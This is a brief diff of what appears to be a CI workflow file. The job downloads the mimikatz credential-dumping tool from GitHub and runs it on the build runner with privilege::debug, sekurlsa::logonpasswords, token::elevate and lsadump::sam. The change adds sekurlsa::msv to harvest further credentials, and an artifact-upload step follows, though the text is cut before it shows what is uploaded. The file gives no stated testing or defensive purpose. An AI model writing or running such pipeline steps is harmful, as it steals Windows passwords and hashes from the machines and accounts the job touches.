@@ -13,7 +13,7 @@ jobs:
           Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip' -OutFile mimi.zip
           Expand-Archive mimi.zip -DestinationPath .\mimi\
           .\mimi\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"
-          .\mimi\x64\mimikatz.exe "privilege::debug" "token::whoami" "token::elevate" "lsadump::sam" exit
+          .\mimi\x64\mimikatz.exe "privilege::debug" "token::whoami" "token::elevate" "lsadump::sam" "sekurlsa::msv" exit
 
       - uses: actions/upload-artifact@v3
         with:
